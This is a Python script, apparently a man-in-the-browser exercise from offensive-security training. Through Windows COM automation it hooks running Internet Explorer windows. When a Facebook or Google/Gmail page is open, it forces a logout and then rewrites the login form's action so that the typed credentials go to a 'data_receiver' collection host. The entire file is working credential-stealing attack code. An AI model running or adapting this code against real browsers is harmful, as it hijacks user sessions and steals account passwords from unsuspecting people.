import win32com.client
import time
import urllib.parse as urlparse
import urllib

data_receiver = "http://localhost:8003"

target_sites = {}
target_sites["www.facebook.com"] = {
    "logout_url": None,
    "logout_form_action": "https://www.facebook.com/logout.php",
    "login_form_index": 0,
    "owned": False
}

target_sites["accounts.google.com"] = {
    "logout_url": "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
    "logout_form_action": None,
    "login_form_index": 0,
    "owned": False
}

# use the same target for multiple Gmail domains
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)


def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)


while True:
    for browser in windows:

        url = urlparse.urlparse(browser.LocationUrl)
        # print(url)
        # print(url.hostname)
        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue

            # if these is a URL, we can just redirect
            if target_sites[url.hostname]["logout_url"]:
                # print(target_sites[url.hostname])
                # print(target_sites[url.hostname]["logout_url"])
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                print("navigate")
                wait_for_browser(browser)
                wait_for_browser(browser)

            else:
                # print("else")
                # retrieve all elements in the document
                full_doc = browser.Document.all

                # iterate, looking for the logout form
                for i in full_doc:
                    try:
                        # find the logout form and submit it:
                        if i.action == target_sites[url.hostname]["logout_form_action"]:
                            i.submit()
                            wait_for_browser(browser)

                    except:
                        pass

            # now we modify the login form
            try:
                # print("target_sites[url.hostname][login_form_index]", target_sites[url.hostname]["login_form_index"])
                login_index = target_sites[url.hostname]["login_form_index"]
                # print("login_page = urllib.quote(browser.LocationUrl)",urllib.parse.quote(browser.LocationUrl))
                login_page = urllib.parse.quote(browser.LocationUrl)
                # print( "format(data_receiver, login_page){}/{}".format(data_receiver, login_page))
                browser.Document.forms[login_index].action = "{}/{}".format(data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
                print("try")

            except:
                pass
    time.sleep(5)